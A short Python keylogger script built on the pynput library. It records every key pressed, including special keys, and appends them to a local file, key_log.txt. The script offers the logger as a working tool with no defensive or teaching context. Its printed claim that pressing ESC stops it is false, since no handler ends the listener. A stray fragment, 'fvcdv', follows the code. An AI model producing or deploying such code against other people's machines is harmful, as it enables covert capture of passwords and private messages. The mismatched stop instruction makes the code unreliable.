from pynput import keyboard

# Path to store the logs
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key.name}]")  # Handle special keys
    except Exception as e:
        print(f"Error: {e}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
fvcdv
